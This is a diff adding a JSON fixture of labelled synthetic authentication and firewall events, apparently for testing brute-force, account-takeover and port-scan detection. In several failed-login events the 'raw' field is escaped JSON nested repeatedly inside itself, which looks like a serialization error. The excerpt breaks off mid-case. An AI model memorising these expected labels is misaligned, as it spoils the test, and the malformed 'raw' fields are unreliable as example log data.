@@ -1,0 +1,1022 @@
+[
+  {
+    "name": "normal_successful_authentication",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "two_password_typos",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "authentication_failure_burst",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:00+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:01+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:02+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      }
+    ],
+    "expected_types": [
+      "brute_force"
+    ],
+    "note": ""
+  },
+  {
+    "name": "failure_then_success",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:00+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:01+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:02+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:05+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 4,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:05+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      }
+    ],
+    "expected_types": [
+      "brute_force",
+      "account_takeover"
+    ],
+    "note": ""
+  },
+  {
+    "name": "successful_auth_resets_failure_sequence",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:00+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:01+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:02+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:05+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 4,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:05+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:06+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 5,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:06+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      }
+    ],
+    "expected_types": [
+      "brute_force",
+      "account_takeover"
+    ],
+    "note": ""
+  },
+  {
+    "name": "host_boundary_authentication",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "b",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"b\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "single_firewall_drop",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "distinct_port_scan_with_retries",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 22,
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 22}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 22,
+        "line": 2,
